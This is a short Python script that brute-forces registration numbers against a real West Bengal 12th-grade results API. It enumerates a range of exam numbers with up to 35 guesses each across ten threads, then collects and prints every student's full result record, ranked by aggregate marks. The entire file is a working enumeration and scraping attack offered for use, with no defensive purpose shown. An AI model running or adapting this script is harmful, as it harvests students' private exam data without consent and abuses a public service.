import requests
import concurrent.futures
import threading
import json

base_number = 1089
base_reg = 4231114411
results = []

lock = threading.Lock()
MAX_RETRIES = 35  # increased

def fetch_until_success(number):
    delta = number - base_number
    reg_no = base_reg + delta
    attempts = 0

    while attempts < MAX_RETRIES:
        params = {
            "tag": "wb_12th_result",
            "roll": "453211",
            "number": str(number),
            "registration_no": str(reg_no),
            "year": "2025",
            "wb_id": "105",
            "source": "1"
        }

        try:
            response = requests.get("https://www.fastresult.in/board-results/wbresultapi12/api/get-12th-result", params=params, timeout=5)
            data = response.json()

            if data.get("status") == "success":
                with lock:
                    results.append({
                        "number": number,
                        "reg_no": str(reg_no),
                        "full_response": data
                    })
                return
            else:
                print(f"[-] Failed: Num={number}, RegNo={reg_no} | Invalid response")
        except Exception as e:
            print(f"[!] Error at Number={number}, RegNo={reg_no}: {e}")

        reg_no += 1
        attempts += 1

numbers_to_check = list(range(1088, 1300))

with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    executor.map(fetch_until_success, numbers_to_check)

# Sort by aggregate descending if possible
def extract_aggregate(entry):
    try:
        return int(entry["full_response"]["data"]["board_result"]["result"]["Aggregate"])
    except:
        return 0

sorted_results = sorted(results, key=extract_aggregate, reverse=True)

# Display full API response for each success
for r in sorted_results:
    print(f"\n[+] Number: {r['number']} | Reg: {r['reg_no']}")
    print(json.dumps(r["full_response"], indent=2))
    print("-" * 80)
